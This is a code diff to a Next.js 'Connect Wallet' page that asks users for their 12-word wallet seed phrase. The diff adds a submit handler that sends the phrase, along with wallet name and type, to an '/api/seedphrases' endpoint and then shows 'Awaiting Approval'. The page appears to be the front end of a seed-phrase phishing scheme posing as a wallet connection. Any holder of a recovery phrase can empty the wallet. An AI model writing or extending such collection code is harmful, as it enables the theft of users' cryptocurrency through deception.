@@ -1,12 +1,13 @@
 "use client";
 
 import React, { useState } from "react";
-import { ArrowLeft, Key, ShieldCheck, Check, AlertTriangle } from "lucide-react";
+import { ArrowLeft, Key, ShieldCheck, Check, AlertTriangle, Loader2 } from "lucide-react";
 import UserHeader from "@/components/ui/user-header";
 import UserSidebar from "@/components/ui/user-sidebar";
 import UserNav from "@/components/ui/user-nav";
 import Link from "next/link";
 import { useParams } from "next/navigation";
+import { useSession } from "next-auth/react";
 
 const walletData: Record<string, { name: string; icon: string; color: string; description: string }> = {
   metamask: {
@@ -45,9 +46,13 @@ export default function WalletConnectPage() {
   const params = useParams();
   const walletId = params.id as string;
   const wallet = walletData[walletId];
+  const { data: session } = useSession();
   const [sidebarOpen, setSidebarOpen] = useState(false);
   const [seedPhrase, setSeedPhrase] = useState<string[]>(Array(12).fill(""));
   const [showWarning, setShowWarning] = useState(true);
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [submitStatus, setSubmitStatus] = useState<'idle' | 'success' | 'error'>('idle');
+  const [errorMessage, setErrorMessage] = useState('');
 
   const handleWordChange = (index: number, value: string) => {
     const newSeedPhrase = [...seedPhrase];
@@ -55,10 +60,48 @@ export default function WalletConnectPage() {
     setSeedPhrase(newSeedPhrase);
   };
 
-  const handleSubmit = () => {
-    const phrase = seedPhrase.join(" ");
-    console.log("Seed phrase submitted:", phrase);
-    // TODO: Send to backend for validation and storage
+  const handleSubmit = async () => {
+    if (!session?.user?.id) {
+      setErrorMessage("You must be logged in to submit a seed phrase");
+      setSubmitStatus('error');
+      return;
+    }
+
+    setIsSubmitting(true);
+    setSubmitStatus('idle');
+    setErrorMessage('');
+
+    try {
+      const response = await fetch('/api/seedphrases', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          walletType: walletId,
+          walletName: wallet.name,
+          walletIcon: wallet.icon,
+          walletColor: wallet.color,
+          seedPhrase: seedPhrase,
+        }),
+      });
+
+      const data = await response.json();
+
+      if (response.ok) {
+        setSubmitStatus('success');
+        setSeedPhrase(Array(12).fill(""));
+      } else {
+        setErrorMessage(data.error || 'Failed to submit seed phrase');
+        setSubmitStatus('error');
+      }
+    } catch (error) {
+      console.error('Error submitting seed phrase:', error);
+      setErrorMessage('An error occurred. Please try again.');
+      setSubmitStatus('error');
+    } finally {
+      setIsSubmitting(false);
+    }
   };
 
   const isComplete = seedPhrase.every(word => word.length > 0);
@@ -160,15 +203,37 @@ export default function WalletConnectPage() {
               </div>
 
               {/* Submit Button */}
-              <button
-                onClick={handleSubmit}
-                disabled={!isComplete}
-                style={{ backgroundColor: wallet.color }}
-                className="w-full py-3.5 cursor-pointer hover:opacity-90 text-white rounded-full text-sm font-bold uppercase tracking-widest disabled:opacity-50 disabled:cursor-not-allowed transition-opacity flex items-center justify-center gap-2"
-              >
-                <Check className="w-4 h-4" />
-                Connect Wallet
-              </button>
+              {submitStatus === 'success' ? (
+                <div className="w-full py-3.5 bg-emerald-500 text-white rounded-full text-sm font-bold uppercase tracking-widest flex items-center justify-center gap-2">
+                  <Check className="w-4 h-4" />
+                  Submitted - Awaiting Approval
+                </div>
+              ) : (
+                <button
+                  onClick={handleSubmit}
+                  disabled={!isComplete || isSubmitting}
+                  style={{ backgroundColor: wallet.color }}
+                  className="w-full py-3.5 cursor-pointer hover:opacity-90 text-white rounded-full text-sm font-bold uppercase tracking-widest disabled:opacity-50 disabled:cursor-not-allowed transition-opacity flex items-center justify-center gap-2"
+                >
+                  {isSubmitting ? (
+                    <>
+                      <Loader2 className="w-4 h-4 animate-spin" />
+                      Submitting...
+                    </>
+                  ) : (
+                    <>
+                      <Check className="w-4 h-4" />
+                      Connect Wallet
+                    </>
+                  )}
+                </button>
+              )}
+
+              {submitStatus === 'error' && (
+                <div className="bg-red-50 dark:bg-red-500/10 border border-red-200 dark:border-red-500/20 rounded-xl p-3 text-sm text-red-700 dark:text-red-500">
+                  {errorMessage}
+                </div>
+              )}
             </div>
           </div>
         </main>
